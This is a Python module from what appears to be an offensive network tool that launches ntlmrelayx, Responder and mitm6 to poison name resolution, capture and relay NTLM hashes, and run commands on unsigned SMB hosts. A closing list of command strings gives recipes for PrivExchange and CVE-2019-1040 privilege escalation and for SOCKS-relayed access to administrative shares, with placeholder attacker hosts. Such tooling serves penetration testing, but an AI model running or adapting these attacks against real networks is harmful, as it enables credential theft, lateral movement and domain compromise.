#!/usr/bin/env python3

import os
from src.process import Process
import re
import os
from src.utils import get_iface
from src.process import Process

cwd = os.getcwd()

def create_ntlmrelayx_cmd(args):
    """
    Creates the ntlmrelayx cmommand string
    """
#    relay_cmd = f'python {cwd}/submodules/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
    relay_cmd = f'python {cwd}/submodules/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'

    if args.target:
        target = f' -t {args.target}'
    else:
        target = f' -tf unsigned-smb-hosts.txt'

    relay_cmd = relay_cmd + target

    if args.mitm6:
        six_poison = ' -6 -wh NetProxy-Service -wa 2'
        relay_cmd = relay_cmd + six_poison

    if args.command:
        relay_cmd = relay_cmd + f' -c "{args.command}"'

    return relay_cmd

def start_ntlmrelayx(args):
    """
    Start ntlmrelayx
    """
    cmd = create_ntlmrelayx_cmd(args)
    logfile_name = 'ntlmrelayx'
    ntlmrelayx = start_process(cmd, logfile_name)

    return ntlmrelayx

def edit_responder_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface=None):
    if not iface:
        iface = get_iface()
    protocols = ['HTTP', 'SMB']
    switch = 'Off'
    conf = 'submodules/Responder/Responder.conf'
    edit_responder_conf(switch, protocols, conf)
    cmd = f'python2 {cwd}/submodules/Responder/Responder.py -wrd -I {iface}'

    logfile_name = 'responder'
    responder = start_process(cmd, logfile_name)

    return responder

def start_mitm6(args):
    cmd = f'python {cwd}/submodules/mitm6.py --ignore-nofqdn'
    if args.domain:
        cmd = cmd + f' -d {args.domain}'
    if args.interface:
        cmd = cmd + f' -i {args.interface}'

    logfile_name = 'mitm6'
    mitm6 = start_process(cmd, logfile_name)

    return mitm6

def start_process(cmd, logfile_name):
    proc = Process(cmd)
    proc.run(f'{cwd}/logs/{logfile_name}.log')

    return proc


# regular
'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
# mitm6
'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
'mitm6 -d <domain> --ignore-nofqnd'
'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
# PrivExchange
'python {}/submodules/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
'python {}/submodules/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
# CVE-2019-1040
'python printerbug.py <DOMAIN/user>@<exchangeServer> <attacker ip>'
'ntlmrelayx.py --remove-mic --escalate-user <UserYouHavePassFor> -t ldap://<DC> -smb2support'
# SMB no admin - note tf should be in format smb://IP
'python ntlmrelayx.py -tf smb-unsigned-hosts.txt -socks -smb2support'
'ntlmrelayx> socks' # list all socks connections
'proxychains smbclient //<targetIP>/c$ -U <DOMAIN/user listed in captured SMB sessions>'